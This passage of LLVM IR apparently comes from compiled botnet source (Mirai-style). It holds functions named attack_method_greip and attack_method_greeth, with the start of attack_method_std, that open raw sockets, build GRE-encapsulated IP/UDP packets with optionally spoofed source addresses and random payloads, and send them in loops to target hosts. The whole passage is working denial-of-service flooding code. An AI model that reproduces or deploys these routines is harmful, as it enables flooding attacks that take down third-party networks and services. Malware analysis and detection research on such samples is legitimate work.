  %.09 = phi i8* [ %14, %12 ], [ %3, %4 ], [ %3, %.loopexit.loopexit ]
  ret i8* %.09
}

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_int(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @util_atoi(i8* nonnull %5, i32 10) #10
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

declare i32 @util_atoi(i8*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @attack_get_opt_ip(i8 zeroext, %struct.attack_option* nocapture readonly, i8 zeroext, i32) local_unnamed_addr #0 {
  %5 = tail call i8* @attack_get_opt_str(i8 zeroext %0, %struct.attack_option* %1, i8 zeroext %2, i8* null)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %4
  %8 = tail call i32 @inet_addr(i8* nonnull %5) #10
  br label %9

; <label>:9:                                      ; preds = %4, %7
  %.0 = phi i32 [ %8, %7 ], [ %3, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greip(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %23 = trunc i32 %22 to i8
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 19, i32 0)
  %25 = trunc i32 %24 to i8
  %26 = load i32, i32* @LOCAL_ADDR, align 4
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %26)
  %28 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %29 = icmp eq i32 %28, -1
  br i1 %29, label %183, label %30

; <label>:30:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %31 = bitcast i32* %5 to i8*
  %32 = call i32 @setsockopt(i32 %28, i32 0, i32 3, i8* nonnull %31, i32 4) #10
  %33 = icmp eq i32 %32, -1
  br i1 %33, label %45, label %.preheader125

.preheader125:                                    ; preds = %30
  store i32 0, i32* %5, align 4
  %34 = zext i8 %0 to i32
  %35 = icmp eq i8 %0, 0
  %.pre129 = sext i32 %21 to i64
  %.pre130 = add nsw i64 %.pre129, 52
  br i1 %35, label %.preheader, label %.lr.ph127

.lr.ph127:                                        ; preds = %.preheader125
  %36 = trunc i64 %.pre130 to i16
  %37 = icmp ne i8 %16, 0
  %38 = add nsw i64 %.pre129, 28
  %39 = trunc i64 %38 to i16
  %40 = xor i16 %12, -1
  %41 = icmp eq i8 %25, 0
  %42 = add nsw i64 %.pre129, 8
  %43 = trunc i64 %42 to i16
  %44 = zext i8 %0 to i64
  br label %58

; <label>:45:                                     ; preds = %30
  %46 = call i32 @close(i32 %28) #10
  br label %183

..preheader_crit_edge:                            ; preds = %98
  %47 = trunc i64 %indvars.iv.next to i32
  store i32 %47, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader125, %..preheader_crit_edge
  %48 = icmp eq i32 %27, -1
  %49 = and i32 %11, 65535
  %50 = icmp eq i32 %49, 65535
  %51 = and i32 %17, 65535
  %52 = icmp eq i32 %51, 65535
  %53 = and i32 %19, 65535
  %54 = icmp eq i32 %53, 65535
  %55 = icmp eq i8 %25, 0
  %56 = icmp eq i8 %23, 0
  %57 = add i32 %21, 8
  br label %.loopexit

; <label>:58:                                     ; preds = %.lr.ph127, %98
  %indvars.iv = phi i64 [ 0, %.lr.ph127 ], [ %indvars.iv.next, %98 ]
  %59 = call noalias i8* @calloc(i64 1510, i64 8) #10
  %60 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %59, i8** %60, align 8
  %61 = getelementptr inbounds i8, i8* %59, i64 24
  %62 = getelementptr inbounds i8, i8* %59, i64 44
  store i8 69, i8* %59, align 4
  %63 = getelementptr inbounds i8, i8* %59, i64 1
  store i8 %10, i8* %63, align 1
  %64 = call zeroext i16 @htons(i16 zeroext %36) #11
  %65 = getelementptr inbounds i8, i8* %59, i64 2
  %66 = bitcast i8* %65 to i16*
  store i16 %64, i16* %66, align 2
  %67 = call zeroext i16 @htons(i16 zeroext %12) #11
  %68 = getelementptr inbounds i8, i8* %59, i64 4
  %69 = bitcast i8* %68 to i16*
  store i16 %67, i16* %69, align 4
  %70 = getelementptr inbounds i8, i8* %59, i64 8
  store i8 %14, i8* %70, align 4
  br i1 %37, label %71, label %75

; <label>:71:                                     ; preds = %58
  %72 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %73 = getelementptr inbounds i8, i8* %59, i64 6
  %74 = bitcast i8* %73 to i16*
  store i16 %72, i16* %74, align 2
  br label %75

; <label>:75:                                     ; preds = %71, %58
  %76 = getelementptr inbounds i8, i8* %59, i64 9
  store i8 47, i8* %76, align 1
  %77 = getelementptr inbounds i8, i8* %59, i64 12
  %78 = bitcast i8* %77 to i32*
  store i32 %27, i32* %78, align 4
  %79 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %80 = load i32, i32* %79, align 4
  %81 = getelementptr inbounds i8, i8* %59, i64 16
  %82 = bitcast i8* %81 to i32*
  store i32 %80, i32* %82, align 4
  %83 = call zeroext i16 @htons(i16 zeroext 2048) #11
  %84 = getelementptr inbounds i8, i8* %59, i64 22
  %85 = bitcast i8* %84 to i16*
  store i16 %83, i16* %85, align 2
  store i8 69, i8* %61, align 4
  %86 = getelementptr inbounds i8, i8* %59, i64 25
  store i8 %10, i8* %86, align 1
  %87 = call zeroext i16 @htons(i16 zeroext %39) #11
  %88 = getelementptr inbounds i8, i8* %59, i64 26
  %89 = bitcast i8* %88 to i16*
  store i16 %87, i16* %89, align 2
  %90 = call zeroext i16 @htons(i16 zeroext %40) #11
  %91 = getelementptr inbounds i8, i8* %59, i64 28
  %92 = bitcast i8* %91 to i16*
  store i16 %90, i16* %92, align 4
  %93 = getelementptr inbounds i8, i8* %59, i64 32
  store i8 %14, i8* %93, align 4
  br i1 %37, label %94, label %98

; <label>:94:                                     ; preds = %75
  %95 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %96 = getelementptr inbounds i8, i8* %59, i64 30
  %97 = bitcast i8* %96 to i16*
  store i16 %95, i16* %97, align 2
  br label %98

; <label>:98:                                     ; preds = %94, %75
  %99 = getelementptr inbounds i8, i8* %59, i64 33
  store i8 17, i8* %99, align 1
  %. = select i1 %41, i32 1023, i32 %80
  %100 = getelementptr inbounds i8, i8* %59, i64 40
  %101 = bitcast i8* %100 to i32*
  store i32 %., i32* %101, align 4
  %102 = call zeroext i16 @htons(i16 zeroext %18) #11
  %103 = bitcast i8* %62 to i16*
  store i16 %102, i16* %103, align 2
  %104 = call zeroext i16 @htons(i16 zeroext %20) #11
  %105 = getelementptr inbounds i8, i8* %59, i64 46
  %106 = bitcast i8* %105 to i16*
  store i16 %104, i16* %106, align 2
  %107 = call zeroext i16 @htons(i16 zeroext %43) #11
  %108 = getelementptr inbounds i8, i8* %59, i64 48
  %109 = bitcast i8* %108 to i16*
  store i16 %107, i16* %109, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %110 = icmp slt i64 %indvars.iv.next, %44
  br i1 %110, label %58, label %..preheader_crit_edge

.loopexit.loopexit:                               ; preds = %154
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %35, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %154
  %storemerge124126 = phi i32 [ %181, %154 ], [ 0, %.lr.ph.preheader ]
  %111 = sext i32 %storemerge124126 to i64
  %112 = getelementptr inbounds i8*, i8** %8, i64 %111
  %113 = load i8*, i8** %112, align 8
  %114 = getelementptr inbounds i8, i8* %113, i64 24
  %115 = bitcast i8* %114 to %struct.iphdr*
  %116 = getelementptr inbounds i8, i8* %113, i64 44
  %117 = getelementptr inbounds i8, i8* %113, i64 52
  %118 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %111, i32 2
  %119 = load i8, i8* %118, align 4
  %120 = icmp ult i8 %119, 32
  br i1 %120, label %121, label %128

; <label>:121:                                    ; preds = %.lr.ph
  %122 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %111, i32 1
  %123 = load i32, i32* %122, align 4
  %124 = call i32 @ntohl(i32 %123) #11
  %125 = call i32 @htonl(i32 %124) #11
  %126 = getelementptr inbounds i8, i8* %113, i64 16
  %127 = bitcast i8* %126 to i32*
  store i32 %125, i32* %127, align 4
  br label %128

; <label>:128:                                    ; preds = %121, %.lr.ph
  br i1 %48, label %129, label %132

; <label>:129:                                    ; preds = %128
  %130 = getelementptr inbounds i8, i8* %113, i64 12
  %131 = bitcast i8* %130 to i32*
  store i32 0, i32* %131, align 4
  br label %132

; <label>:132:                                    ; preds = %129, %128
  br i1 %50, label %133, label %138

; <label>:133:                                    ; preds = %132
  %134 = getelementptr inbounds i8, i8* %113, i64 4
  %135 = bitcast i8* %134 to i16*
  store i16 0, i16* %135, align 4
  %136 = getelementptr inbounds i8, i8* %113, i64 28
  %137 = bitcast i8* %136 to i16*
  store i16 999, i16* %137, align 4
  br label %138

; <label>:138:                                    ; preds = %133, %132
  br i1 %52, label %139, label %141

; <label>:139:                                    ; preds = %138
  %140 = bitcast i8* %116 to i16*
  store i16 0, i16* %140, align 2
  br label %141

; <label>:141:                                    ; preds = %139, %138
  br i1 %54, label %142, label %145

; <label>:142:                                    ; preds = %141
  %143 = getelementptr inbounds i8, i8* %113, i64 46
  %144 = bitcast i8* %143 to i16*
  store i16 0, i16* %144, align 2
  br label %145

; <label>:145:                                    ; preds = %142, %141
  br i1 %55, label %150, label %146

; <label>:146:                                    ; preds = %145
  %147 = getelementptr inbounds i8, i8* %113, i64 16
  %148 = bitcast i8* %147 to i32*
  %149 = load i32, i32* %148, align 4
  br label %150

; <label>:150:                                    ; preds = %145, %146
  %.sink3 = phi i32 [ %149, %146 ], [ 0, %145 ]
  %151 = getelementptr inbounds i8, i8* %113, i64 40
  %152 = bitcast i8* %151 to i32*
  store i32 %.sink3, i32* %152, align 4
  br i1 %56, label %154, label %153

; <label>:153:                                    ; preds = %150
  call void @rand_str(i8* nonnull %117, i32 %21)
  %.pre = load i32, i32* %5, align 4
  br label %154

; <label>:154:                                    ; preds = %150, %153
  %155 = phi i32 [ %storemerge124126, %150 ], [ %.pre, %153 ]
  %156 = getelementptr inbounds i8, i8* %113, i64 10
  %157 = bitcast i8* %156 to i16*
  store i16 0, i16* %157, align 2
  %158 = bitcast i8* %113 to i16*
  %159 = call zeroext i16 @checksum_generic(i16* %158, i32 20)
  store i16 %159, i16* %157, align 2
  %160 = getelementptr inbounds i8, i8* %113, i64 34
  %161 = bitcast i8* %160 to i16*
  store i16 0, i16* %161, align 2
  %162 = bitcast i8* %114 to i16*
  %163 = call zeroext i16 @checksum_generic(i16* %162, i32 20)
  store i16 %163, i16* %161, align 2
  %164 = getelementptr inbounds i8, i8* %113, i64 50
  %165 = bitcast i8* %164 to i16*
  store i16 0, i16* %165, align 2
  %166 = getelementptr inbounds i8, i8* %113, i64 48
  %167 = bitcast i8* %166 to i16*
  %168 = load i16, i16* %167, align 2
  %169 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %115, i8* nonnull %116, i16 zeroext %168, i32 %57)
  store i16 %169, i16* %165, align 2
  %170 = sext i32 %155 to i64
  %171 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 0, i32 0
  store i16 2, i16* %171, align 4
  %172 = getelementptr inbounds i8, i8* %113, i64 16
  %173 = bitcast i8* %172 to i32*
  %174 = load i32, i32* %173, align 4
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 0, i32 2, i32 0
  store i32 %174, i32* %175, align 4
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 0, i32 1
  store i16 0, i16* %176, align 2
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %170, i32 0
  %178 = bitcast %struct.sockaddr_in* %177 to %struct.sockaddr*
  %179 = call i64 @sendto(i32 %28, i8* nonnull %113, i64 %.pre130, i32 16384, %struct.sockaddr* %178, i32 16) #10
  %180 = load i32, i32* %5, align 4
  %181 = add nsw i32 %180, 1
  store i32 %181, i32* %5, align 4
  %182 = icmp slt i32 %181, %34
  br i1 %182, label %.lr.ph, label %.loopexit.loopexit

; <label>:183:                                    ; preds = %4, %45
  ret void
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #1

declare i32 @close(i32) local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greeth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = zext i8 %0 to i64
  %10 = tail call noalias i8* @calloc(i64 %9, i64 8) #10
  %11 = bitcast i8* %10 to i8**
  %12 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %13 = trunc i32 %12 to i8
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %15 = trunc i32 %14 to i16
  %16 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %17 = trunc i32 %16 to i8
  %18 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %19 = trunc i32 %18 to i8
  %20 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %21 = trunc i32 %20 to i16
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %23 = trunc i32 %22 to i16
  %24 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %26 = trunc i32 %25 to i8
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 19, i32 0)
  %28 = trunc i32 %27 to i8
  %29 = load i32, i32* @LOCAL_ADDR, align 4
  %30 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %29)
  %31 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %32 = icmp eq i32 %31, -1
  br i1 %32, label %197, label %33

; <label>:33:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %34 = bitcast i32* %5 to i8*
  %35 = call i32 @setsockopt(i32 %31, i32 0, i32 3, i8* nonnull %34, i32 4) #10
  %36 = icmp eq i32 %35, -1
  br i1 %36, label %48, label %.preheader132

.preheader132:                                    ; preds = %33
  store i32 0, i32* %5, align 4
  %37 = zext i8 %0 to i32
  %38 = icmp eq i8 %0, 0
  %.pre = sext i32 %24 to i64
  %.pre136 = add nsw i64 %.pre, 66
  br i1 %38, label %.preheader, label %.lr.ph134

.lr.ph134:                                        ; preds = %.preheader132
  %39 = trunc i64 %.pre136 to i16
  %40 = icmp ne i8 %19, 0
  %41 = add nsw i64 %.pre, 28
  %42 = trunc i64 %41 to i16
  %43 = xor i16 %15, -1
  %44 = icmp eq i8 %28, 0
  %45 = add nsw i64 %.pre, 8
  %46 = trunc i64 %45 to i16
  %47 = zext i8 %0 to i64
  br label %65

; <label>:48:                                     ; preds = %33
  %49 = call i32 @close(i32 %31) #10
  br label %197

..preheader_crit_edge:                            ; preds = %108
  %50 = trunc i64 %indvars.iv.next to i32
  store i32 %50, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader132, %..preheader_crit_edge
  %51 = icmp eq i32 %30, -1
  %52 = and i32 %14, 65535
  %53 = icmp eq i32 %52, 65535
  %54 = and i32 %20, 65535
  %55 = icmp eq i32 %54, 65535
  %56 = and i32 %22, 65535
  %57 = icmp eq i32 %56, 65535
  %58 = icmp eq i8 %28, 0
  %59 = bitcast i32* %6 to i8*
  %60 = bitcast i32* %7 to i8*
  %61 = bitcast i32* %8 to i8*
  %62 = getelementptr inbounds i8, i8* %61, i64 2
  %63 = icmp eq i8 %26, 0
  %64 = add i32 %24, 8
  br label %.loopexit

; <label>:65:                                     ; preds = %.lr.ph134, %108
  %indvars.iv = phi i64 [ 0, %.lr.ph134 ], [ %indvars.iv.next, %108 ]
  %66 = call noalias i8* @calloc(i64 1510, i64 8) #10
  %67 = getelementptr inbounds i8*, i8** %11, i64 %indvars.iv
  store i8* %66, i8** %67, align 8
  %68 = getelementptr inbounds i8, i8* %66, i64 38
  %69 = getelementptr inbounds i8, i8* %66, i64 58
  store i8 69, i8* %66, align 4
  %70 = getelementptr inbounds i8, i8* %66, i64 1
  store i8 %13, i8* %70, align 1
  %71 = call zeroext i16 @htons(i16 zeroext %39) #11
  %72 = getelementptr inbounds i8, i8* %66, i64 2
  %73 = bitcast i8* %72 to i16*
  store i16 %71, i16* %73, align 2
  %74 = call zeroext i16 @htons(i16 zeroext %15) #11
  %75 = getelementptr inbounds i8, i8* %66, i64 4
  %76 = bitcast i8* %75 to i16*
  store i16 %74, i16* %76, align 4
  %77 = getelementptr inbounds i8, i8* %66, i64 8
  store i8 %17, i8* %77, align 4
  br i1 %40, label %78, label %82

; <label>:78:                                     ; preds = %65
  %79 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %80 = getelementptr inbounds i8, i8* %66, i64 6
  %81 = bitcast i8* %80 to i16*
  store i16 %79, i16* %81, align 2
  br label %82

; <label>:82:                                     ; preds = %78, %65
  %83 = getelementptr inbounds i8, i8* %66, i64 9
  store i8 47, i8* %83, align 1
  %84 = getelementptr inbounds i8, i8* %66, i64 12
  %85 = bitcast i8* %84 to i32*
  store i32 %30, i32* %85, align 4
  %86 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %87 = load i32, i32* %86, align 4
  %88 = getelementptr inbounds i8, i8* %66, i64 16
  %89 = bitcast i8* %88 to i32*
  store i32 %87, i32* %89, align 4
  %90 = call zeroext i16 @htons(i16 zeroext 25944) #11
  %91 = getelementptr inbounds i8, i8* %66, i64 22
  %92 = bitcast i8* %91 to i16*
  store i16 %90, i16* %92, align 2
  %93 = call zeroext i16 @htons(i16 zeroext 2048) #11
  %94 = getelementptr inbounds i8, i8* %66, i64 36
  %95 = bitcast i8* %94 to i16*
  store i16 %93, i16* %95, align 1
  store i8 69, i8* %68, align 4
  %96 = getelementptr inbounds i8, i8* %66, i64 39
  store i8 %13, i8* %96, align 1
  %97 = call zeroext i16 @htons(i16 zeroext %42) #11
  %98 = getelementptr inbounds i8, i8* %66, i64 40
  %99 = bitcast i8* %98 to i16*
  store i16 %97, i16* %99, align 2
  %100 = call zeroext i16 @htons(i16 zeroext %43) #11
  %101 = getelementptr inbounds i8, i8* %66, i64 42
  %102 = bitcast i8* %101 to i16*
  store i16 %100, i16* %102, align 4
  %103 = getelementptr inbounds i8, i8* %66, i64 46
  store i8 %17, i8* %103, align 4
  br i1 %40, label %104, label %108

; <label>:104:                                    ; preds = %82
  %105 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %106 = getelementptr inbounds i8, i8* %66, i64 44
  %107 = bitcast i8* %106 to i16*
  store i16 %105, i16* %107, align 2
  br label %108

; <label>:108:                                    ; preds = %104, %82
  %109 = getelementptr inbounds i8, i8* %66, i64 47
  store i8 17, i8* %109, align 1
  %. = select i1 %44, i32 1023, i32 %87
  %110 = getelementptr inbounds i8, i8* %66, i64 54
  %111 = bitcast i8* %110 to i32*
  store i32 %., i32* %111, align 4
  %112 = call zeroext i16 @htons(i16 zeroext %21) #11
  %113 = bitcast i8* %69 to i16*
  store i16 %112, i16* %113, align 2
  %114 = call zeroext i16 @htons(i16 zeroext %23) #11
  %115 = getelementptr inbounds i8, i8* %66, i64 60
  %116 = bitcast i8* %115 to i16*
  store i16 %114, i16* %116, align 2
  %117 = call zeroext i16 @htons(i16 zeroext %46) #11
  %118 = getelementptr inbounds i8, i8* %66, i64 62
  %119 = bitcast i8* %118 to i16*
  store i16 %117, i16* %119, align 2
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %120 = icmp slt i64 %indvars.iv.next, %47
  br i1 %120, label %65, label %..preheader_crit_edge

.loopexit.loopexit:                               ; preds = %168
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %38, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %168
  %storemerge131133 = phi i32 [ %195, %168 ], [ 0, %.lr.ph.preheader ]
  %121 = sext i32 %storemerge131133 to i64
  %122 = getelementptr inbounds i8*, i8** %11, i64 %121
  %123 = load i8*, i8** %122, align 8
  %124 = getelementptr inbounds i8, i8* %123, i64 24
  %125 = getelementptr inbounds i8, i8* %123, i64 38
  %126 = bitcast i8* %125 to %struct.iphdr*
  %127 = getelementptr inbounds i8, i8* %123, i64 58
  %128 = getelementptr inbounds i8, i8* %123, i64 66
  %129 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %121, i32 2
  %130 = load i8, i8* %129, align 4
  %131 = icmp ult i8 %130, 32
  br i1 %131, label %132, label %139

; <label>:132:                                    ; preds = %.lr.ph
  %133 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %121, i32 1
  %134 = load i32, i32* %133, align 4
  %135 = call i32 @ntohl(i32 %134) #11
  %136 = call i32 @htonl(i32 %135) #11
  %137 = getelementptr inbounds i8, i8* %123, i64 16
  %138 = bitcast i8* %137 to i32*
  store i32 %136, i32* %138, align 4
  br label %139

; <label>:139:                                    ; preds = %132, %.lr.ph
  br i1 %51, label %140, label %143

; <label>:140:                                    ; preds = %139
  %141 = getelementptr inbounds i8, i8* %123, i64 12
  %142 = bitcast i8* %141 to i32*
  store i32 0, i32* %142, align 4
  br label %143

; <label>:143:                                    ; preds = %140, %139
  br i1 %53, label %144, label %149

; <label>:144:                                    ; preds = %143
  %145 = getelementptr inbounds i8, i8* %123, i64 4
  %146 = bitcast i8* %145 to i16*
  store i16 0, i16* %146, align 4
  %147 = getelementptr inbounds i8, i8* %123, i64 42
  %148 = bitcast i8* %147 to i16*
  store i16 999, i16* %148, align 4
  br label %149

; <label>:149:                                    ; preds = %144, %143
  br i1 %55, label %150, label %152

; <label>:150:                                    ; preds = %149
  %151 = bitcast i8* %127 to i16*
  store i16 0, i16* %151, align 2
  br label %152

; <label>:152:                                    ; preds = %150, %149
  br i1 %57, label %153, label %156

; <label>:153:                                    ; preds = %152
  %154 = getelementptr inbounds i8, i8* %123, i64 60
  %155 = bitcast i8* %154 to i16*
  store i16 0, i16* %155, align 2
  br label %156

; <label>:156:                                    ; preds = %153, %152
  br i1 %58, label %161, label %157

; <label>:157:                                    ; preds = %156
  %158 = getelementptr inbounds i8, i8* %123, i64 16
  %159 = bitcast i8* %158 to i32*
  %160 = load i32, i32* %159, align 4
  br label %161

; <label>:161:                                    ; preds = %156, %157
  %.sink3 = phi i32 [ %160, %157 ], [ 0, %156 ]
  %162 = getelementptr inbounds i8, i8* %123, i64 54
  %163 = bitcast i8* %162 to i32*
  store i32 %.sink3, i32* %163, align 4
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  call void @util_memcpy(i8* %124, i8* nonnull %59, i32 4) #10
  %164 = getelementptr inbounds i8, i8* %123, i64 30
  call void @util_memcpy(i8* %164, i8* nonnull %60, i32 4) #10
  %165 = getelementptr inbounds i8, i8* %123, i64 28
  call void @util_memcpy(i8* %165, i8* nonnull %61, i32 2) #10
  %166 = getelementptr inbounds i8, i8* %123, i64 34
  call void @util_memcpy(i8* %166, i8* %62, i32 2) #10
  br i1 %63, label %168, label %167

; <label>:167:                                    ; preds = %161
  call void @rand_str(i8* nonnull %128, i32 %24)
  br label %168

; <label>:168:                                    ; preds = %161, %167
  %169 = getelementptr inbounds i8, i8* %123, i64 10
  %170 = bitcast i8* %169 to i16*
  store i16 0, i16* %170, align 2
  %171 = bitcast i8* %123 to i16*
  %172 = call zeroext i16 @checksum_generic(i16* %171, i32 20)
  store i16 %172, i16* %170, align 2
  %173 = getelementptr inbounds i8, i8* %123, i64 48
  %174 = bitcast i8* %173 to i16*
  store i16 0, i16* %174, align 2
  %175 = bitcast i8* %125 to i16*
  %176 = call zeroext i16 @checksum_generic(i16* %175, i32 20)
  store i16 %176, i16* %174, align 2
  %177 = getelementptr inbounds i8, i8* %123, i64 64
  %178 = bitcast i8* %177 to i16*
  store i16 0, i16* %178, align 2
  %179 = getelementptr inbounds i8, i8* %123, i64 62
  %180 = bitcast i8* %179 to i16*
  %181 = load i16, i16* %180, align 2
  %182 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* nonnull %126, i8* nonnull %127, i16 zeroext %181, i32 %64)
  store i16 %182, i16* %178, align 2
  %183 = load i32, i32* %5, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %184, i32 0, i32 0
  store i16 2, i16* %185, align 4
  %186 = getelementptr inbounds i8, i8* %123, i64 16
  %187 = bitcast i8* %186 to i32*
  %188 = load i32, i32* %187, align 4
  %189 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %184, i32 0, i32 2, i32 0
  store i32 %188, i32* %189, align 4
  %190 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %184, i32 0, i32 1
  store i16 0, i16* %190, align 2
  %191 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %184, i32 0
  %192 = bitcast %struct.sockaddr_in* %191 to %struct.sockaddr*
  %193 = call i64 @sendto(i32 %31, i8* nonnull %123, i64 %.pre136, i32 16384, %struct.sockaddr* %192, i32 16) #10
  %194 = load i32, i32* %5, align 4
  %195 = add nsw i32 %194, 1
  store i32 %195, i32* %5, align 4
  %196 = icmp slt i32 %195, %37
  br i1 %196, label %.lr.ph, label %.loopexit.loopexit

; <label>:197:                                    ; preds = %4, %48
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_std(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call noalias i8* @calloc(i64 %6, i64 4) #10
  %10 = bitcast i8* %9 to i32*
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
